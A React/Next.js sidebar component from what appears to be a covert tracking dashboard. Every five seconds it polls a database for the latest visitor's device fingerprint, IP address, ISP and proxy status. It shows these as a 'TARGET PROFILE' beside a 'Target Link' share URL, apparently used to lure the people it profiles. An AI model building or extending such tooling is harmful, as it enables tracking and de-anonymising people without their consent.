import { useEffect, useState } from 'react';
import { supabase } from '@/lib/supabase';
import { Activity, Database, Globe, Home, LayoutDashboard, Map as MapIcon, Search, Settings, ShieldAlert, Users } from 'lucide-react';
import Link from 'next/link';
import BroadcastControl from './osint/BroadcastControl';

export default function OsintSidebar() {
    const [target, setTarget] = useState<any>(null);

    useEffect(() => {
        const fetchTarget = async () => {
            // Get most recent active session with fingerprint
            const { data } = await supabase
                .from('fingerprints')
                .select(`
          *,
          sessions!inner(active),
          ip_logs(*)
        `)
                .eq('sessions.active', true)
                .order('created_at', { ascending: false })
                .limit(1)
                .single();

            if (data) setTarget(data);
        };

        fetchTarget();
        const interval = setInterval(fetchTarget, 5000);
        return () => clearInterval(interval);
    }, []);

    return (
        <div className="w-64 h-full bg-[#0f111a] border-r border-gray-800 flex flex-col py-6 gap-6 z-20 overflow-y-auto">
            <div className="flex flex-col items-center px-4">
                <div className="p-2 bg-blue-600 rounded-lg mb-4">
                    <Globe className="w-6 h-6 text-white" />
                </div>
                <h2 className="text-white font-bold text-sm tracking-wider">TARGET PROFILE</h2>
            </div>

            {/* Broadcast Control */}
            <BroadcastControl />

            {target ? (
                <div className="px-4 space-y-4">
                    <div className="bg-[#1a1d29] p-3 rounded-lg border border-gray-800">
                        <p className="text-[10px] text-gray-500 uppercase">Device</p>
                        <p className="text-white text-xs font-mono">{target.device_model}</p>
                        <p className="text-gray-400 text-[10px]">{target.os_name} {target.os_version}</p>
                    </div>

                    <div className="bg-[#1a1d29] p-3 rounded-lg border border-gray-800">
                        <p className="text-[10px] text-gray-500 uppercase">Network</p>
                        <p className="text-white text-xs font-mono">{target.ip_logs?.[0]?.ip_address || 'Unknown'}</p>
                        <p className="text-gray-400 text-[10px]">{target.ip_logs?.[0]?.isp}</p>
                        {target.ip_logs?.[0]?.is_proxy && <span className="text-red-500 text-[10px] font-bold">PROXY DETECTED</span>}
                    </div>

                    <div className="bg-[#1a1d29] p-3 rounded-lg border border-gray-800">
                        <p className="text-[10px] text-gray-500 uppercase">Fingerprint</p>
                        <p className="text-white text-[10px] font-mono break-all">{target.visitor_id}</p>
                        <p className="text-gray-400 text-[10px] mt-1">{target.screen_resolution}</p>
                        <p className="text-gray-400 text-[10px]">{target.browser_name}</p>
                    </div>

                    <div className="bg-cyan-500/10 p-3 rounded-lg border border-cyan-500/30">
                        <p className="text-[10px] text-cyan-400 uppercase mb-1">Target Link</p>
                        <a
                            href={`/share/${target.session_id}`}
                            target="_blank"
                            className="text-white text-[10px] font-mono break-all hover:underline block"
                        >
                            {typeof window !== 'undefined' ? window.location.origin : ''}/share/{target.session_id}
                        </a>
                    </div>
                </div>
            ) : (
                <div className="px-4 text-center">
                    <p className="text-gray-500 text-xs">Scanning for targets...</p>
                </div>
            )}

            <nav className="flex flex-col gap-2 px-2 mt-auto">
                <Link href="/" className="flex items-center gap-3 p-2 text-gray-400 hover:text-white hover:bg-gray-800 rounded-lg transition-colors">
                    <Home className="w-4 h-4" />
                    <span className="text-xs">Home</span>
                </Link>
                {/* ... other links ... */}
            </nav>
        </div>
    );
}
